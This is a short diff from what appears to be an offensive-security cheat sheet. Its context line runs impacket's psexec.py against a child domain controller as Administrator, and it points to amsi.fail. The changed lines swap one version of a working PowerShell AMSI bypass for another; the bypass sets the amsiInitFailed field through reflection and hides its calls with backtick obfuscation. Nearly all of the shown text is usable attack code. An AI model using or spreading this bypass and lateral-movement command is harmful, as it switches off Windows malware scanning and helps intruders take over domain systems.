@@ -116,8 +116,8 @@ python3 /opt/impacket/examples/psexec.py -dc-ip <CHILD DC FQDN> <DOMAIN>/Adminis
 - https://amsi.fail/
 - Or use the one below
 ```
-$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils');
-$v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
+$v=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+$v."Get`Fie`ld"('amsiInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true);
 ```
 
 ```
